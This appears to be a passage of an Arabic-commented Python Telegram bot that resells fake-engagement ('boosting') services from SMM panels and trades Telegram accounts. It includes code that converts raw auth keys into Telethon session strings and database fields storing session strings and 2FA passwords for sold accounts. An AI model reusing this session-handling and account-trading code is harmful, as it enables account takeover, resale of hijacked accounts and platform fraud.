#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
بوت تيلغرام متكامل مع منصة SMMMAIN.COM وموقع JustAnotherPanel
المتغيرات المطلوبة في Railway:
  BOT_TOKEN                  - توكن البوت
  OWNER_ID                   - ايدي المالك
  API_KEY                    - مفتاح API لموقع SMMMAIN.COM (الموقع 1)
  JUSTANOTHERPANEL_API_KEY   - مفتاح API لموقع JustAnotherPanel.com (الموقع 2)
  ADMIN_GROUP_ID             - ايدي الكروب الذي تصله الطلبات
"""

import os
import re
import asyncio
import time
import random
import math
import requests
import logging
import traceback
from datetime import date, datetime, timedelta, timezone
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    LabeledPrice, BotCommand, BotCommandScopeChat
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, PreCheckoutQueryHandler,
    ChatMemberHandler, ContextTypes, filters
)
from telegram.constants import ParseMode
from telegram.error import NetworkError, TimedOut, RetryAfter

from telethon import TelegramClient, events
from telethon.sessions import StringSession
import struct, base64, socket as _socket

# ────────────────────────────────────────────────────────────
#  تحويل Pyrogram JSON → Telethon StringSession
# ────────────────────────────────────────────────────────────
_TG_DC = {
    1: ("149.154.175.53",  443),
    2: ("149.154.167.51",  443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.91",  443),
    5: ("91.108.56.130",   443),
}

def pyrogram_json_to_telethon(data: dict) -> str | None:
    """
    يحوّل صيغة Pyrogram JSON إلى Telethon StringSession.
    يتوقع dict يحتوي على:
      - dc_id   : رقم مركز البيانات (1-5)
      - auth_key: مفتاح المصادقة بصيغة hex (512 رمز = 256 بايت)
    يُرجع StringSession string جاهز للاستخدام، أو None عند الفشل.

    صيغة Telethon StringSession الصحيحة:
      '1' + base64url( struct.pack('>B4sH256s', dc_id, ip_bytes, port, auth_key) )
    """
    try:
        dc_id    = int(data.get("dc_id") or 0)
        auth_hex = (data.get("auth_key") or "").strip()
        if not dc_id or not auth_hex:
            return None
        auth_key = bytes.fromhex(auth_hex)
        if len(auth_key) != 256:
            return None
        ip, port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
        packed = struct.pack(
            ">B4sH256s",
            dc_id,                      # dc_id  (1 byte)
            _socket.inet_aton(ip),      # IP     (4 bytes)
            port,                       # port   (2 bytes)
            auth_key,                   # key    (256 bytes)
        )
        return "1" + base64.urlsafe_b64encode(packed).decode("ascii")
    except Exception:
        return None

def _maybe_convert_session(raw: str) -> str:
    """
    إذا كانت raw عبارة عن JSON يحتوي dc_id + auth_key (صيغة Pyrogram)
    يحوّلها إلى Telethon StringSession ويُعيدها، وإلا يُعيد raw كما هي.
    """
    s = raw.strip()
    if s.startswith("{"):
        import json as _j
        try:
            d = _j.loads(s)
            converted = pyrogram_json_to_telethon(d)
            if converted:
                return converted
        except Exception:
            pass
    return s
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, FloodWaitError, PasswordHashInvalidError
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest, CheckPasswordRequest
from telethon.password import compute_check
from telethon.tl.functions.account import (
    GetAuthorizationsRequest, ResetAuthorizationRequest,
    GetPasswordRequest, ResetPasswordRequest,
)
from telethon.tl.types import (
    account as tl_account,
)
from telethon.tl.functions.messages import StartBotRequest

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger(__name__)

# ────────────────────────────────────────────────────────────
#  خادم HTTP بسيط لمنع النوم على Render المجاني
# ────────────────────────────────────────────────────────────
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK - Bot is running!")
    def log_message(self, format, *args):
        pass

def run_health_server():
    port = int(os.getenv("PORT", "8080"))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    server.serve_forever()

def start_health_server():
    t = threading.Thread(target=run_health_server, daemon=True)
    t.start()
    logger.info("✅ Health server started")

# ────────────────────────────────────────────────────────────
#  إعدادات البيئة
# ────────────────────────────────────────────────────────────
def _safe_int_env(name: str, default: int = 0) -> int:
    """يقرأ متغير بيئة كرقم صحيح، ويرجع القيمة الافتراضية إذا كانت القيمة غير موجودة أو غير صالحة."""
    raw = os.getenv(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        logger.warning(f"⚠️ المتغير البيئي {name} له قيمة غير صالحة كرقم ({raw!r})، سيتم استخدام {default}.")
        return default


BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
OWNER_ID       = _safe_int_env("OWNER_ID", 0)
API_KEY        = os.getenv("API_KEY", "")
ADMIN_GROUP_ID   = _safe_int_env("ADMIN_GROUP_ID", 0)
NUMBERS_GROUP_ID = _safe_int_env("NUMBERS_GROUP_ID", 0)  # كروب إشعارات الأرقام (منفصل عن كروب الطلبات)
API_URL        = "https://smmmain.com/api/v2"

JUSTANOTHERPANEL_API_KEY = os.getenv("JUSTANOTHERPANEL_API_KEY", "")
SMMFOLLOWS_API_KEY       = os.getenv("SMMFOLLOWS_API_KEY", "")
TELEGRAM_API_ID   = os.getenv("TELEGRAM_API_ID", "")
TELEGRAM_API_HASH = os.getenv("TELEGRAM_API_HASH", "")

# تخزين مؤقت (في الذاكرة) لجلسات تسجيل دخول الأرقام قيد التنفيذ من قبل المالك
_pending_number_logins = {}
_monitor_clients = {}   # phone_number -> TelegramClient متصل بشكل دائم لمراقبة تنبيهات الحساب
_buyer_received_codes = {}  # buyer_user_id -> {"code": str, "time": float} آخر كود وصل بعد البيع
_demo_purchases = {}        # buyer_user_id -> {"phone": str, "session_str": str, "twofa": str, "purchase_time": datetime} — شراء بكود تجريبي (لا يُسجَّل في prize_exchanges)
_pending_bulk_import  = set()  # user_ids ينتظرون إرسال JSON للاستيراد الجماعي
# phone_number -> timestamp: نضع علامة هنا كل مرة يغيّر البوت نفسه كلمة/تفعيل التحقق بخطوتين لرقم،
# لكي لا يُبلَّغ المالك برسالة "تغيّر التحقق" الرسمية من تيليجرام كأنها اختراق، بينما هي فعل البوت نفسه.
_expected_2fa_change = {}
_referral_rate_tracker = {}  # inviter_id -> list[float] لكشف رشق الإحالات (5 في 5 ثوانٍ)
_EXPECTED_2FA_WINDOW_SEC = 180
_monitor_tasks   = {}   # phone_number -> asyncio.Task لحلقة run_until_disconnected
_allow_5min_phones = {}  # phone_number -> {"until": float, "used": bool}
#   until: وقت انتهاء نافذة السماح
#   used:  True بعد أول دخول سُمح به — يُغلق النافذة لأي دخول ثانٍ
_permanently_allowed_phones = set()  # أرقام فيها جلسة خارجية مسموح لها بالبقاء للأبد
#   يُضاف الرقم عند استخدام نافذة 5 دقائق — يُزال فقط عند البيع أو الطرد اليدوي
JUSTANOTHERPANEL_API_URL = "https://justanotherpanel.com/api/v2"
SMMFOLLOWS_API_URL       = "https://smmfollows.io/api/v2"

# ────────────────────────────────────────────────────────────
#  المواقع (المصادر) المتاحة لسحب الخدمات منها
# ────────────────────────────────────────────────────────────
PANEL_MAP = {
    1: {"name": "SMMMAIN",         "key": API_KEY,                  "url": API_URL},
    2: {"name": "JustAnotherPanel", "key": JUSTANOTHERPANEL_API_KEY, "url": JUSTANOTHERPANEL_API_URL},
    3: {"name": "SmmFollows",       "key": SMMFOLLOWS_API_KEY,       "url": SMMFOLLOWS_API_URL},
}

# ────────────────────────────────────────────────────────────
#  قاعدة البيانات - PostgreSQL
# ────────────────────────────────────────────────────────────
import psycopg2
import psycopg2.extras
import psycopg2.pool

DATABASE_URL = (
    os.environ.get("DATABASE_URL") or
    os.environ.get("DB_FILE") or
    os.environ.get("POSTGRES_URL") or
    os.environ.get("POSTGRESQL_URL") or
    ""
)

_pool = None
_pool_lock = threading.Lock()

def get_pool():
    global _pool
    if _pool is None:
        with _pool_lock:
            if _pool is None:
                _pool = psycopg2.pool.ThreadedConnectionPool(
                    1, 20, DATABASE_URL,
                    connect_timeout=10
                )
    return _pool

def reset_pool():
    """إعادة تهيئة pool الاتصالات عند حدوث خطأ فادح"""
    global _pool
    with _pool_lock:
        if _pool is not None:
            try:
                _pool.closeall()
            except Exception:
                pass
            _pool = None
    logger.warning("⚠️ تم إعادة تهيئة pool قاعدة البيانات")


class SmartCursor:
    """Wrapper يحوّل ? إلى %s ويعيد نفسه من execute() لدعم السلسلة .fetchone()"""
    def __init__(self, cur):
        self._cur = cur

    def execute(self, sql, params=None):
        sql = sql.replace('?', '%s')
        if params is None:
            self._cur.execute(sql)
        else:
            self._cur.execute(sql, params)
        return self

    def fetchone(self):
        return self._cur.fetchone()

    def fetchall(self):
        return self._cur.fetchall()

    @property
    def rowcount(self):
        return self._cur.rowcount

    def __iter__(self):
        return iter(self._cur)


_DB_RETRY_EXC = (psycopg2.OperationalError, psycopg2.InterfaceError)


class _DBContext:
    """
    مدير سياق آمن لاتصالات PostgreSQL.
    - يختبر الاتصال عند الاستحواذ ويعيد المحاولة مرة واحدة بعد reset_pool.
    - يعيد المحاولة في __exit__ عند فشل commit بسبب انقطاع الشبكة.
    - يُرجع الاتصال المكسور دائماً بـ close=True حتى لا يعود إلى الـ pool.
    """
    def __enter__(self):
        self._conn = None
        self._pool = None
        for attempt in range(2):
            try:
                self._pool = get_pool()
                self._conn = self._pool.getconn()
                # اختبار الاتصال سريعاً
                cur = self._conn.cursor()
                cur.execute("SELECT 1")
                cur.close()
                break
            except _DB_RETRY_EXC as e:
                if attempt == 0:
                    logger.warning(f"⚠️ خطأ في الاتصال بالDB، إعادة المحاولة... ({e})")
                    # أعد الاتصال المعطوب إن وُجد
                    if self._conn is not None and self._pool is not None:
                        try:
                            self._pool.putconn(self._conn, close=True)
                        except Exception:
                            pass
                        self._conn = None
                    reset_pool()
                else:
                    raise
        self._raw = self._conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        return SmartCursor(self._raw)

    def __exit__(self, exc_type, exc_val, exc_tb):
        conn_broken = False
        try:
            if exc_type:
                self._conn.rollback()
            else:
                self._conn.commit()
        except _DB_RETRY_EXC as e:
            logger.warning(f"⚠️ فشل commit/rollback: {e}")
            conn_broken = True
            try:
                self._conn.rollback()
            except Exception:
                pass
        finally:
            try:
                self._raw.close()
            except Exception:
                pass
            # استخدم نفس الـ pool الذي أصدر الاتصال
            if self._conn is not None and self._pool is not None:
                try:
                    self._pool.putconn(self._conn, close=conn_broken)
                except Exception:
                    pass
        return False


def db_conn():
    return _DBContext()


def with_db_retry(fn, *args, **kwargs):
    """
    تشغيل دالة تستخدم db_conn مع إعادة محاولة واحدة عند انقطاع الاتصال.
    مفيد لعمليات الكتابة الحساسة مثل set_setting.
    """
    for attempt in range(2):
        try:
            return fn(*args, **kwargs)
        except _DB_RETRY_EXC as e:
            if attempt == 0:
                logger.warning(f"⚠️ إعادة محاولة بعد خطأ DB: {e}")
                reset_pool()
            else:
                raise

def init_db():
      logger.info(f"🐘 PostgreSQL DB | DATABASE_URL configured: {bool(DATABASE_URL)}")
      with db_conn() as c:
          c.execute("""
          CREATE TABLE IF NOT EXISTS users (
              user_id      BIGINT PRIMARY KEY,
              username     TEXT,
              full_name    TEXT,
              points       INTEGER DEFAULT 0,
              invited_by   BIGINT DEFAULT 0,
              total_orders INTEGER DEFAULT 0,
              joined_at    TEXT DEFAULT CURRENT_DATE,
              bot_user_num INTEGER,
              verified     INTEGER DEFAULT 0
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS orders (
              id           SERIAL PRIMARY KEY,
              user_id      BIGINT,
              service_id   INTEGER,
              link         TEXT,
              quantity     INTEGER,
              cost_points  INTEGER DEFAULT 0,
              cost_stars   INTEGER DEFAULT 0,
              api_order_id TEXT DEFAULT '',
              status       TEXT DEFAULT 'pending',
              order_code   TEXT,
              created_at   TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS services (
              id              SERIAL PRIMARY KEY,
              category        TEXT,
              api_service_id  INTEGER,
              panel           INTEGER DEFAULT 1,
              name_ar         TEXT,
              description     TEXT,
              min_qty         INTEGER,
              max_qty         INTEGER,
              price_per_point REAL,
              active          INTEGER DEFAULT 1
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS settings (
              key   TEXT PRIMARY KEY,
              value TEXT
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS daily_gifts (
              user_id    BIGINT PRIMARY KEY,
              last_claim TEXT
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_funding (
              id               SERIAL PRIMARY KEY,
              user_id          BIGINT,
              channel_username TEXT,
              funding_type     TEXT,
              cost_points      INTEGER,
              active           INTEGER DEFAULT 1,
              created_at       TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS star_transactions (
              id                  SERIAL PRIMARY KEY,
              user_id             BIGINT,
              stars               INTEGER,
              points_given        INTEGER,
              telegram_payment_id TEXT,
              status              TEXT DEFAULT 'completed',
              created_at          TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS point_transfers (
              id         SERIAL PRIMARY KEY,
              from_user  BIGINT,
              to_user    BIGINT,
              points     INTEGER,
              fee        INTEGER,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS prize_exchanges (
              id          SERIAL PRIMARY KEY,
              user_id     BIGINT,
              prize_type  TEXT,
              prize_value TEXT,
              points_cost INTEGER,
              status      TEXT DEFAULT 'pending',
              created_at  TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_stock (
              id            SERIAL PRIMARY KEY,
              phone_number  TEXT UNIQUE,
              assigned_to   BIGINT,
              assigned_at   TIMESTAMPTZ,
              added_at      TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS mandatory_channels (
              id               SERIAL PRIMARY KEY,
              channel_username TEXT UNIQUE,
              channel_title    TEXT,
              owner_user_id    BIGINT DEFAULT 0,
              funding_type     TEXT DEFAULT 'mandatory',
              active           INTEGER DEFAULT 1
          )""")
          for _alt in [
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS target_members INTEGER DEFAULT 0",
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS current_members INTEGER DEFAULT 0",
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'active'",
              "ALTER TABLE mandatory_channels ADD COLUMN IF NOT EXISTS queued INTEGER DEFAULT 0",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS order_code TEXT",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS owner_seen BOOLEAN DEFAULT FALSE",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_at TIMESTAMPTZ",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_pts INTEGER DEFAULT 0",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_reason TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS ever_sold BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS session_string TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS sessions_reset BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS force_listed BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS frozen_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS twofa_password TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_frozen BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_authorized BOOLEAN DEFAULT TRUE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_device_count INTEGER DEFAULT -1",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS deleted_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS kicked_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS auto_2fa_enabled BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS twofa_reset_date TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS is_solo BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS can_send_code BOOLEAN DEFAULT FALSE",
              "ALTER TABLE services ADD COLUMN IF NOT EXISTS platform TEXT DEFAULT 'tg'",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS banned INTEGER DEFAULT 0",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_at TIMESTAMPTZ",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason TEXT",
              "ALTER TABLE channel_join_rewards ADD COLUMN IF NOT EXISTS joined_at TIMESTAMPTZ DEFAULT NOW()",
          ]:
              try: c.execute(_alt)
              except Exception: pass
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_funding_counts (
              id         SERIAL PRIMARY KEY,
              user_id    BIGINT NOT NULL,
              funding_id INTEGER NOT NULL,
              UNIQUE(user_id, funding_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS custom_prizes (
              id          SERIAL PRIMARY KEY,
              name        TEXT NOT NULL,
              quantity    INTEGER DEFAULT 1,
              points_cost INTEGER NOT NULL,
              active      INTEGER DEFAULT 1,
              created_at  TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS promo_codes (
              code       TEXT PRIMARY KEY,
              max_uses   INTEGER DEFAULT 1,
              used_count INTEGER DEFAULT 0,
              points     INTEGER DEFAULT 0,
              active     INTEGER DEFAULT 1,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS promo_uses (
              code    TEXT,
              user_id BIGINT,
              used_at TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (code, user_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_purchase_codes (
              code       TEXT PRIMARY KEY,
              max_uses   INTEGER DEFAULT 1,
              used_count INTEGER DEFAULT 0,
              active     INTEGER DEFAULT 1,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_purchase_code_uses (
              code    TEXT,
              user_id BIGINT,
              used_at TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (code, user_id)
          )""")
          try:
              c.execute("ALTER TABLE promo_uses ADD COLUMN IF NOT EXISTS used_at TIMESTAMPTZ DEFAULT NOW()")
          except Exception:
              pass
          c.execute("""
          CREATE TABLE IF NOT EXISTS exchange_star_packages (
              id     SERIAL PRIMARY KEY,
              stars  INTEGER NOT NULL,
              active INTEGER DEFAULT 1
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_join_rewards (
              user_id    BIGINT,
              channel_id BIGINT,
              joined_at  TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (user_id, channel_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS referral_tasks (
              id           SERIAL PRIMARY KEY,
              label        TEXT NOT NULL,
              bot_username TEXT NOT NULL,
              start_param  TEXT NOT NULL,
              active       INTEGER DEFAULT 1,
              created_at   TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS referral_completions (
              task_id   INTEGER NOT NULL,
              stock_id  INTEGER NOT NULL,
              status    TEXT DEFAULT 'pending',
              done_at   TIMESTAMPTZ,
              error_msg TEXT,
              PRIMARY KEY (task_id, stock_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS menu_items (
              id           SERIAL PRIMARY KEY,
              menu         TEXT,
              label        TEXT,
              action_type  TEXT DEFAULT 'builtin',
              action_value TEXT,
              width        INTEGER DEFAULT 2,
              sort_order   INTEGER DEFAULT 0,
              enabled      INTEGER DEFAULT 1
          )""")
          # القيم الافتراضية للإعدادات
          default_settings = [
              ('join_channel_reward', '45'),
              ('daily_gift_points', '50'),
              ('referral_points', '30'),
              ('star_to_points', '250'),
              ('exchange_star_rate', '2000'),
              ('telegram_number_cost', '5000'),
              ('transfer_fee_percent', '1'),
              ('mandatory_channel_cost', '200'),
              ('internal_channel_cost', '100'),
              ('welcome_message', 'أهلاً وسهلاً بك في البوت!'),
              ('owner_contact', ''),
              ('total_bot_orders', '0'),
              ('total_bot_users', '0'),
              ('asiacell_text', '⚠️ الشحن التلقائي عبر اسيا سيل غير متاح حالياً.\nيرجى التواصل مع المالك.'),
              ('captcha_enabled', '0'),
              ('maintenance_mode', '0'),
              ('number_exchange_enabled', '0'),
              ('exchange_success_msg', ''),
              ('mandatory_channel_min_members', '0'),
              ('internal_channel_min_members', '0'),
              ('owner_contact_label', '💬 تواصل مع المالك'),
              ('support_contact_label', '🛎 تواصل مع الدعم'),
              ('channel_leave_penalty', '75'),
              # إعدادات الاشتراك الإجباري بالنجوم
              ('mandatory_stars_min_members', '50'),
              ('mandatory_stars_tier1_max', '120'),
              ('mandatory_stars_tier1_price_x100', '50'),   # 0.50 نجمة × 100
                            ('mandatory_stars_tier2_price_x100', '33'),   # 0.33 نجمة × 100
              # إعدادات الاشتراك الإجباري بالنقاط
              ('mandatory_points_price', '5'),    # سعر العضو الواحد بالنقاط
              ('mandatory_points_min',   '50'),   # الحد الأدنى للأعضاء
              # مهلة المغادرة الآمنة للاشتراك الداخلي (بالساعات)
              ('internal_leave_grace_hours', '24'),
          ]
          for k, v in default_settings:
              c.execute(
                  "INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING",
                  (k, v)
              )
      # إضافة أعمدة جديدة بشكل آمن (تُتجاهل إن كانت موجودة)
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN verified INTEGER DEFAULT 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE services ADD COLUMN panel INTEGER DEFAULT 1")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN referral_credited INTEGER DEFAULT 0")
              # المستخدمون المدعوون سابقاً كانت نقاطهم تُمنح فوراً — علّمهم كمكتملين لتفادي منحهم مرتين
              c.execute("UPDATE users SET referral_credited=1 WHERE invited_by IS NOT NULL AND invited_by != 0")
      except Exception:
          pass
      # إضافة عمود partial_refund_pts لتتبع النقاط المستردّة من الطلبات الجزئية
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE orders ADD COLUMN IF NOT EXISTS partial_refund_pts INTEGER DEFAULT 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_points_blocked INTEGER DEFAULT 0")
      except Exception:
          pass
      # عمود لحظة اعتماد الإحالة (بتوقيت عالمي دقيق) — يُستخدم لتصفية قائمة
      # "الأكثر إرسالاً لرابط الدعوة" حسب الفترة (24 ساعة / يوم / أسبوع / شهر)
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS credited_at TIMESTAMPTZ")
              # تعبئة القيمة لمن اعتُمدت إحالته قبل إضافة هذا العمود (وإلا
              # لن يظهر في قوائم "الأكثر إرسالاً" لأن credited_at ستكون NULL)
              c.execute(
                  "UPDATE users SET credited_at=joined_at::timestamptz "
                  "WHERE referral_credited=1 AND credited_at IS NULL"
              )
      except Exception as e:
          logger.warning(f"⚠️ فشل تعبئة credited_at للدعوات القديمة: {e}")
      # إعادة تسمية زر "بدء بوت" إلى "رشق بدء (ستارت) بوت" مع إبقاء نفس الخدمات (نفس action_value)
      try:
          with db_conn() as c:
              c.execute(
                  "UPDATE menu_items SET label=%s WHERE action_type='builtin' AND action_value='cat:start_bot' AND label != %s",
                  ("🤖 رشق بدء (ستارت) بوت", "🤖 رشق بدء (ستارت) بوت")
              )
      except Exception:
          pass
      # تنظيف تلقائي: حذف جزء السعر فقط من أوصاف الخدمات وإبقاء باقي النص
      try:
          with db_conn() as c:
              svcs_with_desc = c.execute(
                  "SELECT id, description, price_per_point FROM services WHERE description IS NOT NULL AND description != ''"
              ).fetchall()
          cleaned = 0
          for s in svcs_with_desc:
              stripped = _strip_price_from_desc(s["description"], float(s["price_per_point"] or 0))
              if stripped != (s["description"] or "").strip():
                  with db_conn() as c:
                      c.execute("UPDATE services SET description=%s WHERE id=%s", (stripped, s["id"]))
                  cleaned += 1
          if cleaned:
              logger.info(f"🧹 تم تنظيف السعر من وصف {cleaned} خدمة تلقائياً.")
      except Exception as e:
          logger.warning(f"⚠️ فشل تنظيف أوصاف الأسعار: {e}")

def _normalize_desc(desc: str) -> str:
    """يُطبّع الاختصارات الشائعة في أوصاف خدمات SMM إلى العربية.
    K → ألف  |  /D → /يوم  |  /H → /ساعة  |  /W → /أسبوع  |  /M → /شهر
    كما يُصحّح 'كيلوجرام' و'كيلو' المكتوبة بدلاً من 'ألف' خطأً."""
    if not desc:
        return desc

    t = desc

    # تصحيح "كيلوجرام" / "كيلو جرام" / "كيلو" المكتوبة بدلاً من ألف
    t = re.sub(r"كيلو\s*جرام", "ألف", t)
    t = re.sub(r"كيلوجرام",     "ألف", t)
    t = re.sub(r"\bكيلو\b",     "ألف", t)

    # تطبيع الوحدات الزمنية: /Day /D /daily
    t = re.sub(r"/\s*(?:day|daily)\b",   "/يوم",    t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*D\b",               "/يوم",    t, flags=re.IGNORECASE)
    t = re.sub(r"\bper\s+day\b",         "يومياً",  t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:hour|hr)\b",     "/ساعة",   t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*H\b",               "/ساعة",   t, flags=re.IGNORECASE)
    t = re.sub(r"\bper\s+hour\b",        "بالساعة", t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:week|wk)\b",     "/أسبوع",  t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*W\b",               "/أسبوع",  t, flags=re.IGNORECASE)

    t = re.sub(r"/\s*(?:month|mo)\b",    "/شهر",    t, flags=re.IGNORECASE)
    t = re.sub(r"/\s*M\b",               "/شهر",    t, flags=re.IGNORECASE)

    # تطبيع K (ألف) — مثل 5K أو K/يوم
    # نضع \b حول K حتى لا نؤثر على كلمات مثل OK
    t = re.sub(r"(\d)\s*[Kk]\b", r"\1 ألف", t)   # 5K → 5 ألف
    t = re.sub(r"\b[Kk]\b",      "ألف",     t)   # K وحيدة → ألف

    return t.strip()


def _strip_price_from_desc(desc: str, price_per_point: float = 0.0) -> str | None:
    """يُطبّع الاختصارات أولاً ثم يحذف جزء السعر فقط، ويُبقي باقي النص.
    يعيد None إذا لم يتبق شيء بعد الحذف."""
    if not desc:
        return None

    text = _normalize_desc(desc)   # K→ألف، /D→/يوم، كيلوجرام→ألف … أولاً

    # 1) حذف أنماط الدولار: $0.5  /  0.5$  /  USD 0.5  /  $0.5/1000  /  0.5 USD
    text = re.sub(r"\$\s*\d+(?:[.,]\d+)?(?:\s*/\s*\d+)?", "", text, flags=re.IGNORECASE)
    text = re.sub(r"\d+(?:[.,]\d+)?\s*\$", "", text)
    text = re.sub(r"USD\s*\d+(?:[.,]\d+)?", "", text, flags=re.IGNORECASE)
    text = re.sub(r"\d+(?:[.,]\d+)?\s*USD", "", text, flags=re.IGNORECASE)

    # 2) حذف أرقام قريبة من سعر الخدمة بالدولار (price_per_point / 100_000)
    if price_per_point and price_per_point > 0:
        panel_price = price_per_point / 100_000
        def _remove_price_num(m):
            val = float(m.group(0).replace(",", "."))
            if val > 0 and abs(val - panel_price) / panel_price <= 0.5:
                return ""
            return m.group(0)
        text = re.sub(r"\d+(?:[.,]\d+)?", _remove_price_num, text)

    # 3) تنظيف علامات الترقيم والمسافات الزائدة الناتجة عن الحذف
    text = re.sub(r"[-|/\\،,;:\s]+$", "", text.strip())
    text = re.sub(r"^[-|/\\،,;:\s]+", "", text.strip())
    text = re.sub(r"\s{2,}", " ", text).strip()

    return text if text else None


# للتوافق مع الاستدعاءات القديمة (init_db)
def _desc_has_price(desc: str, price_per_point: float = 0.0) -> bool:
    if not desc:
        return False
    stripped = _strip_price_from_desc(desc, price_per_point)
    return stripped != desc.strip()


def get_setting(key: str) -> str:
    with db_conn() as c:
        row = c.execute("SELECT value FROM settings WHERE key=?", (key,)).fetchone()
        return row["value"] if row else ""

def _do_set_setting(key: str, value: str):
    with db_conn() as c:
        c.execute("INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO UPDATE SET value=EXCLUDED.value", (key, value))

def set_setting(key: str, value: str):
    """حفظ إعداد مع إعادة محاولة تلقائية عند انقطاع الاتصال"""
    with_db_retry(_do_set_setting, key, value)

def is_maintenance_on() -> bool:
    return int(get_setting("maintenance_mode") or "0") == 1

def is_number_exchange_on() -> bool:
    return int(get_setting("number_exchange_enabled") or "0") == 1

MAINTENANCE_MESSAGE = (
    "🛠 *البوت في وضع الصيانة حالياً*\n\n"
    "نعمل على تحسين تجربتك، ونعتذر عن أي إزعاج.\n"
    "سيعود البوت للعمل خلال وقت قصير — شكراً لتفهّمك 💙"
)

def get_or_create_user(user_id: int, username: str, full_name: str, invited_by: int = 0) -> dict:
